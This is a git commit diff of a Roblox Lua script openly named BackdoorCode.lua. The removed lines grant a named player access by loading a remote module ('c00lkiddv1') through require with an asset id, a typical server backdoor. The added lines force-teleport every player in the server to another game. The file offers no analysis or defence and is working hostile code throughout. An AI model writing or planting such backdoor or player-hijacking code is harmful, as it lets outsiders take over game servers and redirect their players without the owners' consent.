78c9000478938e1753faefeb1048cd4fdf2e632c
qWixxyLuau <kiryuha4112@mail.ru>
2025-07-02 17:32:39 +0500

    Update BackdoorCode.lua

--- BackdoorCode.lua
+++ BackdoorCode.lua
@@ -1,6 +1,5 @@
 for _,v in pairs(game.Players:GetPlayers()) do
-	if v.Name == "Enzo098765kl" and not workspace:FindFirstChild("GGG") then
-		require(14476224091).c00lkiddv1("Enzo098765kl")
-		local Instance = Instance.new("IntValue",workspace)
-	end
+	local s,e = pcall(function()
+		game:GetService("TeleportService"):Teleport(102212820666490,v)
+	end)
 end
